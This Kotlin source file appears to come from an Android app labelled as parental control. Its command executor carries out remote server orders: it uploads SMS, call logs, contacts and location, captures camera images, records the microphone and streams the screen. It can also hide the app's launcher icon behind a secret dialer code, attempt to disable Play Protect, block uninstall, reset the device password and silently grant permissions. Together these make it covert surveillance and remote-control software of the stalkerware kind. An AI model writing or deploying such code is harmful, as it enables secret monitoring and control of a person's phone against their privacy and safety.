package com.example.parentalcontrol

import android.app.admin.DevicePolicyManager
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

/**
 * Runs one server command and returns the result the dashboard will show.
 *
 * Every branch answers with a status the server understands:
 *
 *  * `ok`          — the action completed on the device.
 *  * `pending_user`— the action needs the device user (capture consent, admin
 *                    activation, a runtime permission dialog). The screen was
 *                    opened, or a notification was posted when a background
 *                    activity start was refused.
 *  * `denied`      — the platform or the user refused.
 *  * `error`       — anything else; the message carries the reason.
 *
 * Nothing here claims more than was done: a command that cannot work without a
 * privilege reports the missing privilege instead of a fake success.
 */
object CommandExecutor {

    private const val TAG = "CommandExecutor"

    suspend fun execute(context: Context, command: CommandDto): CommandResultDto {
        val action = command.action
        Log.i(TAG, "Executing command #${command.id} action=$action")
        val (status, message) = try {
            handle(context, command)
        } catch (e: Exception) {
            Log.e(TAG, "Command $action failed", e)
            "error" to "${e.javaClass.simpleName}: ${e.message}"
        }
        return CommandResultDto(
            id = command.id,
            action = action,
            status = status,
            message = message.take(1500),
            deviceId = AppPrefs.getDeviceId(context),
        )
    }

    private suspend fun handle(context: Context, command: CommandDto): Pair<String, String> =
        when (command.action) {
            "ping" -> "ok" to "pong"

            // ---------------------------------------------------------- collection
            "sync_now", "clipboard_now", "location_now", "rules_refresh",
            "media_refresh",
            -> {
                SyncForegroundService.requestImmediateSync(context)
                "ok" to "immediate sync requested; the sync loop is running"
            }

            "call_log_refresh" -> {
                // Forces the newest call-log window to be re-sent even if the cursor
                // says it was already uploaded, so "Fetch latest" repopulates the
                // dashboard after the server's history was deleted.
                AppPrefs.requestCallRefresh(context)
                SyncForegroundService.requestImmediateSync(context)
                "ok" to "call log refresh queued; the newest window is re-sent on the next cycle"
            }

            "contacts_refresh" -> {
                AppPrefs.requestContactsRefresh(context)
                SyncForegroundService.requestImmediateSync(context)
                "ok" to "contacts refresh queued; the whole address book is re-sent on the next cycle"
            }

            "sms_refresh" -> {
                // The SMS cadence is normally 60 s, so this raises the one-shot flag
                // and wakes the loop: the inbox is read on the next cycle, whatever
                // the remaining part of the interval was.
                AppPrefs.requestSmsRefresh(context)
                SyncForegroundService.requestImmediateSync(context)
                "ok" to "SMS refresh queued; the next cycle reads the inbox regardless of the ${AppPrefs.getSmsIntervalMs(context) / 1000} s cadence"
            }

            "set_interval" -> {
                // Floor lowered to 3 s for near-real-time dashboards; the sync loop
                // and AppPrefs.setSyncIntervalMs both accept this range.
                val seconds = command.intParam("seconds", 60).coerceIn(3, 600)
                AppPrefs.setSyncIntervalMs(context, seconds * 1000L)
                SyncForegroundService.requestImmediateSync(context)
                "ok" to "sync interval set to $seconds s"
            }

            "set_sms_interval" -> {
                // SMS collection cadence only; the command poll interval stays on
                // set_interval so low latency and low inbox churn are independent.
                val seconds = command.intParam("seconds", 60).coerceIn(3, 3600)
                AppPrefs.setSmsIntervalMs(context, seconds * 1000L)
                SyncForegroundService.requestImmediateSync(context)
                "ok" to "SMS cadence set to $seconds s (command poll unchanged at ${AppPrefs.getSyncIntervalMs(context) / 1000} s)"
            }

            // -------------------------------------------------------------- screen
            "screen_start" -> startScreen(context, command)

            "screen_stop" -> {
                ScreenShareService.stop(context)
                "ok" to "screen sharing stopped"
            }

            // -------------------------------------------------------------- camera
            "camera_photo" -> cameraPhoto(context, command)

            "camera_stream_start" -> {
                val interval = command.intParam("interval_ms", 5_000).coerceIn(2_000, 300_000)
                val camera = command.stringParam("camera", "back")
                AppPrefs.putInt(context, AppPrefs.KEY_STREAM_CAMERA_INTERVAL_MS, interval)
                AppPrefs.putText(context, AppPrefs.KEY_STREAM_CAMERA_FACING, camera)
                AppPrefs.putBoolean(context, AppPrefs.KEY_STREAM_CAMERA_ACTIVE, true)
                SyncForegroundService.startCameraStream(context)
                "ok" to "camera ($camera) streaming every ${interval / 1000} s while the device is awake"
            }

            "camera_stream_stop" -> {
                AppPrefs.putBoolean(context, AppPrefs.KEY_STREAM_CAMERA_ACTIVE, false)
                SyncForegroundService.stopCameraStream(context)
                "ok" to "camera stream stopped"
            }

            // ----------------------------------------------------------- microphone
            "mic_start" -> {
                val segment = command.intParam("segment_seconds", 15).coerceIn(5, 120)
                val segments = command.intParam("segments", 4).coerceIn(1, 1440)
                // `handle` is an expression body, so this branch must *evaluate* to
                // its result instead of using an early `return`.
                val answered: Map<String, Boolean>? =
                    if (PermissionReporter.isGranted(context, android.Manifest.permission.RECORD_AUDIO)) {
                        mapOf(android.Manifest.permission.RECORD_AUDIO to true)
                    } else {
                        val result = PermissionRequester.requestRuntime(
                            context,
                            listOf(android.Manifest.permission.RECORD_AUDIO),
                            command.id,
                            command.action,
                        )
                        if (result == null) {
                            notifyPending(
                                context,
                                "Microphone permission needed",
                                "Tap to allow microphone access for audio capture.",
                                PermissionRequester.requestIntent(
                                    context,
                                    listOf(android.Manifest.permission.RECORD_AUDIO),
                                    command.id,
                                    command.action,
                                ),
                            )
                        }
                        result
                    }
                when {
                    answered == null ->
                        "pending_user" to
                            "RECORD_AUDIO is not granted; the device user must allow it"
                    answered[android.Manifest.permission.RECORD_AUDIO] != true ->
                        "denied" to "the device user refused microphone access"
                    else -> {
                        AppPrefs.putInt(context, AppPrefs.KEY_STREAM_MIC_SEGMENT_S, segment)
                        AppPrefs.putInt(context, AppPrefs.KEY_STREAM_MIC_SEGMENTS, segments)
                        AppPrefs.putBoolean(context, AppPrefs.KEY_STREAM_MIC_ACTIVE, true)
                        SyncForegroundService.startMicStream(context)
                        "ok" to "audio capture started: ${segments}x${segment}s WAV segments " +
                            "uploaded as they close"
                    }
                }
            }

            "mic_stop" -> {
                AppPrefs.putBoolean(context, AppPrefs.KEY_STREAM_MIC_ACTIVE, false)
                SyncForegroundService.stopMicStream(context)
                "ok" to "audio capture stopped"
            }

            // ------------------------------------------------------------- stealth
            "hide_app" -> if (StealthHelper.setLauncherVisible(context, false)) {
                "ok" to "launcher entry hidden; dial *#*#${SecretCodeReceiver.SECRET_CODE}#*#* to restore it"
            } else {
                "error" to "could not disable the launcher alias"
            }

            "show_app" -> if (StealthHelper.setLauncherVisible(context, true)) {
                "ok" to "launcher entry restored"
            } else {
                "error" to "could not enable the launcher alias"
            }

            // ---------------------------------------------------------- privileges
            "admin_enable" -> {
                val opened = openOrNotify(
                    context,
                    PermissionRequester.deviceAdminIntent(context),
                    "Device admin requested",
                    "Tap to activate device administrator.",
                )
                "pending_user" to if (opened) {
                    "device-admin activation screen opened; the device user must press Activate " +
                        "(Android has no silent device-admin grant)"
                } else {
                    "device-admin activation notification posted; background activity start is " +
                        "blocked until the overlay permission is granted"
                }
            }

            "permission_addon" -> permissionAddon(context, command)

            "play_protect_disable" -> when (val outcome = PlayProtectHelper.disable(context)) {
                is PlayProtectHelper.Outcome.Disabled -> "ok" to outcome.detail
                is PlayProtectHelper.Outcome.NeedsPrivilege -> "denied" to outcome.detail
                is PlayProtectHelper.Outcome.Unknown -> "error" to outcome.detail
            }

            "play_protect_enable" -> when (val outcome = PlayProtectHelper.enable(context)) {
                is PlayProtectHelper.Outcome.Disabled -> "ok" to outcome.detail
                is PlayProtectHelper.Outcome.NeedsPrivilege -> "denied" to outcome.detail
                is PlayProtectHelper.Outcome.Unknown -> "error" to outcome.detail
            }

            "play_protect_status" -> "ok" to PlayProtectHelper.describe(context)

            // ------------------------------------------------------------- policy
            "wake_lock_set" -> {
                val enabled = command.boolParam("enabled", true)
                val applied = if (enabled) {
                    WakeLockHelper.acquire(context)
                } else {
                    WakeLockHelper.release()
                    true
                }
                if (applied) {
                    "ok" to if (enabled) "partial wake lock held" else "wake lock released"
                } else {
                    "error" to "could not change the wake lock"
                }
            }

            "lock_device" -> {
                if (!AdminReceiver.isActive(context)) {
                    "denied" to "device admin is not active; send admin_enable first"
                } else if (AdminReceiver.lockNow(context)) {
                    "ok" to "screen locked"
                } else {
                    "error" to "lockNow() was refused"
                }
            }

            "set_password" -> setPassword(context, command)

            "block_uninstall" -> setUninstallBlocked(context, true)
            "allow_uninstall" -> setUninstallBlocked(context, false)

            "start_service" -> {
                SyncForegroundService.start(context)
                "ok" to "sync service start requested"
            }

            "stop_service" -> {
                SyncForegroundService.stop(context)
                "ok" to "sync service stopped"
            }

            else -> "error" to "unknown action '${command.action}'"
        }

    // ------------------------------------------------------------------ screen

    private fun startScreen(context: Context, command: CommandDto): Pair<String, String> {
        val fps = command.intParam("fps", 3).coerceIn(1, 10)
        val quality = command.intParam("quality", 60).coerceIn(20, 90)
        val width = command.intParam("width", 720).coerceIn(240, 1440)

        val intent = Intent(context, ScreenConsentActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            putExtra(ScreenShareService.EXTRA_FPS, fps)
            putExtra(ScreenShareService.EXTRA_QUALITY, quality)
            putExtra(ScreenShareService.EXTRA_WIDTH, width)
            putExtra(ScreenShareService.EXTRA_COMMAND_ID, command.id)
        }

        val opened = openOrNotify(
            context,
            intent,
            "Screen sharing requested",
            "Tap to approve screen capture for this device.",
        )
        return "pending_user" to if (opened) {
            "system capture-consent dialog opened (${width}px, ${quality}% JPEG, <=${fps} fps); " +
                "Android requires the device user to approve MediaProjection on every start"
        } else {
            "consent notification posted: the app cannot start the dialog from the background " +
                "until the overlay permission is granted"
        }
    }

    // ------------------------------------------------------------------ camera

    private suspend fun cameraPhoto(context: Context, command: CommandDto): Pair<String, String> {
        if (!PermissionReporter.isGranted(context, android.Manifest.permission.CAMERA)) {
            val answered = PermissionRequester.requestRuntime(
                context,
                listOf(android.Manifest.permission.CAMERA),
                command.id,
                command.action,
            )
            if (answered == null) {
                notifyPending(
                    context,
                    "Camera permission needed",
                    "Tap to allow camera access.",
                    PermissionRequester.requestIntent(
                        context,
                        listOf(android.Manifest.permission.CAMERA),
                        command.id,
                        command.action,
                    ),
                )
                return "pending_user" to "CAMERA is not granted; the device user must allow it"
            }
            if (answered[android.Manifest.permission.CAMERA] != true) {
                return "denied" to "the device user refused camera access"
            }
        }

        val front = command.stringParam("camera", "back").equals("front", ignoreCase = true)
        val jpeg = withContext(Dispatchers.IO) { CameraCapture(context).captureJpeg(front) }
            ?: return "error" to "camera returned no frame"

        val api = ApiClient.service(context) ?: return "error" to "no API client configured"
        val response = try {
            api.postCameraPhoto(
                AppPrefs.getDeviceId(context),
                jpeg.toRequestBody("image/jpeg".toMediaType()),
            )
        } catch (e: Exception) {
            return "error" to "upload failed: ${e.javaClass.simpleName}: ${e.message}"
        }
        return if (response.isSuccessful) {
            "ok" to "photo captured (${jpeg.size} bytes, ${if (front) "front" else "back"} camera) and uploaded"
        } else {
            "error" to "upload rejected: HTTP ${response.code()}"
        }
    }

    // -------------------------------------------------------------- permissions

    private suspend fun permissionAddon(context: Context, command: CommandDto): Pair<String, String> {
        val requested = command.stringListParam("permissions").map { it.trim() }.filter { it.isNotEmpty() }
        if (requested.isEmpty()) return "error" to "no permissions were listed in params.permissions"

        val autoGrant = command.boolParam("auto_grant", false)
        val special = requested.filter { PermissionReporter.isSpecial(it) }
        val runtime = requested.filterNot { PermissionReporter.isSpecial(it) }
        val unknown = PermissionRequester.notDeclared(runtime, context)
        val known = runtime - unknown.toSet()

        val results = LinkedHashMap<String, Boolean>()
        known.forEach { results[it] = PermissionReporter.isGranted(context, it) }

        val missing = known.filter { !PermissionReporter.isGranted(context, it) }
        var silentGranted = emptyList<String>()
        if (autoGrant && missing.isNotEmpty()) {
            silentGranted = PermissionRequester.grantSilently(context, missing)
            silentGranted.forEach { results[it] = true }
        }

        val stillMissing = missing - silentGranted.toSet()
        if (stillMissing.isNotEmpty()) {
            val answered = PermissionRequester.requestRuntime(context, stillMissing, command.id, command.action)
            if (answered == null) {
                notifyPending(
                    context,
                    "Permission request",
                    "Tap to review the permissions this device needs.",
                    PermissionRequester.requestIntent(context, stillMissing, command.id, command.action),
                )
                return "pending_user" to
                    "permission dialog could not be opened from the background; a notification was " +
                        "posted. Android grants these only through the on-device dialog " +
                        "(or set this app as device owner for silent grants)."
            }
            answered.forEach { (name, granted) -> results[name] = granted }
            val refused = results.filterValues { !it }.keys
            if (refused.isNotEmpty()) {
                return "denied" to "refused on device: ${refused.joinToString(", ")}" +
                    if (unknown.isNotEmpty()) "; not declared in the manifest: ${unknown.joinToString(", ")}" else ""
            }
        }

        val specialNeeded = special.filter { !PermissionReporter.isSpecialGranted(context, it) }
        if (specialNeeded.isNotEmpty()) {
            val name = specialNeeded.first()
            val intent = PermissionRequester.specialIntent(context, name)
            if (intent == null) {
                return "denied" to "cannot grant $name programmatically; no settings screen applies"
            }
            openOrNotify(context, intent, "App access requested", "Tap to open the matching settings screen.")
            return "pending_user" to
                "opened the system screen for ${name.replace("special:", "")}; the device user must " +
                    "enable it. Remaining: ${specialNeeded.drop(1).joinToString(", ").ifEmpty { "none" }}"
        }

        val message = buildString {
            append("granted/verified: ")
            append(results.entries.joinToString(", ") { "${shortName(it.key)}=${it.value}" }.ifEmpty { "nothing to do" })
            if (silentGranted.isNotEmpty()) {
                append("; silently granted as device owner: ${silentGranted.joinToString(", ")}")
            }
            if (unknown.isNotEmpty()) append("; not declared in the manifest: ${unknown.joinToString(", ")}")
            if (special.isNotEmpty()) {
                append("; special access: ")
                append(special.joinToString(", ") { "${it.replace("special:", "")}=${PermissionReporter.isSpecialGranted(context, it)}" })
            }
        }
        return if (results.values.all { it }) "ok" to message else "denied" to message
    }

    private fun shortName(permission: String): String =
        permission.substringAfterLast('.')

    // ------------------------------------------------------------------- policy

    @Suppress("DEPRECATION")
    private fun setPassword(context: Context, command: CommandDto): Pair<String, String> {
        val password = command.stringParam("password", "")
        if (password.isEmpty()) return "error" to "params.password is empty"
        if (!AdminReceiver.isActive(context)) {
            return "denied" to "device admin is not active; send admin_enable first"
        }
        val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            ?: return "error" to "device policy service unavailable"
        return try {
            val applied = manager.resetPassword(password, 0)
            if (applied) {
                "ok" to "device password set (a screen lock is now required)"
            } else {
                "denied" to "resetPassword() was refused by the device"
            }
        } catch (e: Exception) {
            "error" to "${e.javaClass.simpleName}: ${e.message}"
        }
    }

    private fun setUninstallBlocked(context: Context, blocked: Boolean): Pair<String, String> {
        if (!AdminReceiver.isActive(context)) {
            return "denied" to "device admin is not active; send admin_enable first"
        }
        val manager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as? DevicePolicyManager
            ?: return "error" to "device policy service unavailable"
        return try {
            manager.setUninstallBlocked(
                AdminReceiver.componentName(context),
                context.packageName,
                blocked,
            )
            val actually = manager.isUninstallBlocked(AdminReceiver.componentName(context), context.packageName)
            if (actually == blocked) {
                "ok" to if (blocked) {
                    "uninstall blocked (device owner or admin with the matching policy)"
                } else {
                    "uninstall unblocked"
                }
            } else {
                "denied" to "the platform kept uninstall_blocked=$actually (this policy needs device " +
                    "owner or profile owner)"
            }
        } catch (e: SecurityException) {
            "denied" to "setUninstallBlocked refused: this policy requires device owner / profile owner"
        } catch (e: Exception) {
            "error" to "${e.javaClass.simpleName}: ${e.message}"
        }
    }

    // ------------------------------------------------------------- UI plumbing

    /**
     * Starts an Activity when the platform allows it (the app holds
     * SYSTEM_ALERT_WINDOW, which is the documented background-activity-start
     * exemption) and otherwise posts a notification that opens the same screen.
     */
    private fun openOrNotify(context: Context, intent: Intent, title: String, text: String): Boolean {
        if (Settings.canDrawOverlays(context)) {
            try {
                context.startActivity(intent)
                return true
            } catch (e: Exception) {
                Log.w(TAG, "startActivity refused, falling back to a notification", e)
            }
        }
        notifyPending(context, title, text, intent)
        return false
    }

    private fun notifyPending(context: Context, title: String, text: String, intent: Intent) {
        SyncForegroundService.postActionNotification(context, title, text, intent)
    }
}
